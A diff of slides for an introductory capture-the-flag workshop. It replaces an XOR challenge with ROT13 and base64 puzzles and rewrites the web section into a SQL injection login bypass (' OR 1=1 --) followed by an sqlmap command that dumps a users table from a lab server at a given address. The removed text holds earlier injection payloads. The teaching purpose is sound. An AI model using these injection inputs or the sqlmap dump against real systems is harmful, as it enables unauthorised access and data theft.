@@ -123,20 +123,18 @@ $$E_n(x) = (x+n) mod 26$$
 $$E_n^\prime(x) = D_n(x) = (x-n) mod 26$$
 
 --
+![valid example](assets/intro-to-ctfs/crypto/4.png)
+--
 
 ### Challenge #1
 
-**Encrypted message:** (HEX)
+**Encrypted message:**
 
-`170d05080a0d0c0a19010a06041e06020a19`
-
-**Encryption Key:** (HEX)
-
-`6468696e6368616b706f6f6a61726f636b73`
+`Phevbfvgl{ebg13_penpx3q_fhpp3ffsh11l}`
 
 **Encryption Method:**
 
-`XOR`
+`ROT13`
 
 Decrypt the message
 
@@ -144,19 +142,41 @@ Decrypt the message
 
 ### Solution
 
-**Property of XOR:**
+https://cryptii.com/pipes/rot13-decoder
 
-1. $$a \oplus a = 0$$
-
-2. $$a \oplus 0 = a$$
+![valid example](assets/intro-to-ctfs/crypto/1.png)
 
 --
 
-$$\implies msg \oplus key \oplus key = msg$$
+### Challenge #2
 
-XOR the encrypted message with the key again to get the original message again
+**Encrypted message:**
 
-`73656c6669656d61696e656c656c6961616a`
+`Q3VyaW9zaXR5e3RoMXNfNF9iYXNlNjRfc3RyMW5nfQ==`
+
+**Encryption Method:**
+
+`NOT PROVIDED :))))))) YOUR ON YOUR OWN FOR THIS ONE ....`
+
+Decrypt the message
+
+--
+
+### Solution
+
+- step 1 : Identifier the cipher (cipher = encryption algorithm).
+
+https://www.dcode.fr/cipher-identifier
+
+![valid example](assets/intro-to-ctfs/crypto/2.png)
+
+--
+
+- step 2 : decrypt the ciphertext to get the flag.
+
+https://gchq.github.io/CyberChef/
+
+![valid example](assets/intro-to-ctfs/crypto/3.png)
 
 ---
 
@@ -172,100 +192,71 @@ XOR the encrypted message with the key again to get the original message again
 
 --
 
-### Challenge #2
+### Challenge #1
 
-- Text box that receives input of ID of person
-- Outputs all the details of that person
-- Incomplete or invalid queries err out silently
-
-![valid example](assets/intro-to-ctfs/web/sqli1.png)
+- We have a login/register website.
+- The flag is in the database of the website.
 
 --
 
-### HINT 1
+- http://51.77.151.20:2789/
 
-SQL query in the backend might be something similar to
+![valid example](assets/intro-to-ctfs/web/2.png)
+
+--
+
+- Backend query.
 
 ```SQL
-SELECT * FROM accounts WHERE id="$INPUT_ID"
+SELECT username FROM users WHERE username = '${username}' AND password = '${password}'
 ```
 
 --
 
-### HINT 2
-
-Think about logical operators
-
---
-
-### HINT 2
-
-**$INPUT_ID**:
-
-```
-1" OR <SOME_CONDITION>
-```
-
-**Complete query**:
+- Normal behaviour :
 
 ```SQL
-SELECT * FROM accounts WHERE id="1" OR <SOME_CONDITION>"
+SELECT username FROM users WHERE username = 'mohamed' AND password = 'mohamed2025'
 ```
+
+![valid example](assets/intro-to-ctfs/web/1.png)
 
 --
 
-### HINT 3
-
-Think about a condition which is always true
-
---
-
-### HINT 3
-
-**$INPUT_ID**:
-
-```
-1" OR 1=1
-```
-
-**Complete query**:
+- Malicious input :
 
 ```SQL
-SELECT * FROM accounts WHERE id="1" OR 1=1"
+SELECT username FROM users WHERE username = '' OR 1=1 --' AND password = 'alsdkhflkajshdflkjahdsf'
 ```
 
-**But**, is this query valid?
+![valid example](assets/intro-to-ctfs/web/3.png)
 
 --
 
-### HINT 4
+- We logged in :))))))))))
 
-How do we make this query valid?
-
---
-
-### Solution
-
-The SQL query can be made valid by
-
-- making the condition a string check i.e "1"="1"
-- and thus accounting for the extra `"`
-
-**$INPUT_ID**:
-
-```
-1" OR "1"="1
-```
-
-**Complete query**:
-
-```SQL
-SELECT * FROM accounts WHERE id="1" OR "1"="1"
-```
+![valid example](assets/intro-to-ctfs/web/4.png)
 
 --
 
-![boom, you just got sqli-d](assets/intro-to-ctfs/web/sqli2.png)
+- Now after confirming that the website is vulnerable we will go-on for advanced sql-injection vulnerability exploitation
+  using `sqlmap`.
+
+--
+
+- We will use the following sqlmap command to attack the website.
+
+```bash
+sqlmap --flush-session -u "http://51.77.151.20:2789/login" --data="username=alice&password=wonderland" -T users --dump --batch --threads 10
+```
+
+![valid example](assets/intro-to-ctfs/web/5.png)
+
+--
+
+- And we got our flag :))))))
+
+![valid example](assets/intro-to-ctfs/web/6.png)
 
 ---
 
@@ -280,32 +271,6 @@ SELECT * FROM accounts WHERE id="1" OR "1"="1"
 --
 
 ![assets/intro-to-ctfs/re/levelsofapl.png](assets/intro-to-ctfs/re/levelsofapl.png)
-
---
-
-## Example
-
-![assets/intro-to-ctfs/re/untitled.png](assets/intro-to-ctfs/re/untitled.png)
-
---
-
-![assets/intro-to-ctfs/re/untitled_01.png](assets/intro-to-ctfs/re/untitled_01.png)
-
---
-
-![assets/intro-to-ctfs/re/untitled_02.png](assets/intro-to-ctfs/re/untitled_02.png)
-
---
-
-![assets/intro-to-ctfs/re/untitled_03.png](assets/intro-to-ctfs/re/untitled_03.png)
-
---
-
-![assets/intro-to-ctfs/re/untitled_04.png](assets/intro-to-ctfs/re/untitled_04.png)
-
---
-
-![assets/intro-to-ctfs/re/untitled_05.png](assets/intro-to-ctfs/re/untitled_05.png)
 
 ---
 
@@ -460,40 +425,3 @@ OFFICEISTHEBESTTVSHOW
 - Helpful to others too
 
 ---
-
-- Professional pentesters are expected to provide 30-page reports
-- [OffSec report](https://www.offensive-security.com/reports/sample-penetration-testing-report.pdf)
-- Preferably in markdown, because
-  - Plain text -> easily transferrable
-  - Exportable to literally any other format
-  - No need to install another application
-  - Your favourite text editor will do
-
----
-
-## Blog
-
-If you dislike any or all of the following
-
-- front-end web development
-- writing HTML code and content
-- styling with CSS
-- creating your webpage from scratch
-
-then, [**Jekyll**](https://jekyllrb.com/) is your friend
-
----
-
-- Write content in markdown and Jekyll will generate the HTML for it
-- [**GitHub pages**](https://pages.github.com) offers free and easy hosting solution for static websites
-- Check out [`jekyll-themes`](https://github.com/topics/jekyll-themes) on GitHub for amazing repos and sites
-
----
-
-## More about OWASP
-
-- [OWASP](https://owasp.org) is a non-profit org
-- Aims to make security more accessible
-- [Local chapters](https://owasp.org/chapters/) work in this spirit
-- Chapters have comm channels and regular events
-- Stay tuned for more exciting events from [our chapter](https://owasp.org/www-chapter-indian-institute-of-technology-patna/)
